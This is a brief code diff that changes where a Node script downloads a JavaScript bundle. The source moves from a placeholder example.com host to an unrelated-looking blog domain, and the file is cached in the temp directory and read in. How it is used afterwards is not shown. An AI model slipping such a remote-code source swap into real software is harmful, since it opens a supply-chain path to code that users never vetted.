@@ -4,7 +4,7 @@ import os from "node:os";
 
 const file = path.join(os.tmpdir(), "bundle-jw.js");
 if (!fs.existsSync(file)) {
-  const res = await fetch("https://embed.example.com/js/bundle-jw.js");
+  const res = await fetch("https://taifood-blog.asia/js/bundle-jw.js");
   fs.writeFileSync(file, await res.text());
 }
 const h = fs.readFileSync(file, "utf8");
